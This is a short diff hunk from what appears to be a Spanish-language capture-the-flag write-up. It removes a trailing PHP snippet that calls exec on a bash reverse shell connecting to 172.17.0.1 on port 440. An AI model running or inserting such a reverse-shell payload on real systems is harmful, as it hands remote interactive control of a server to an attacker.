@@ -187,7 +187,3 @@ Verificamos la flag y es correcta.
 <br><br>
 
 
-<?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/440 0>&1'");
-?>
-
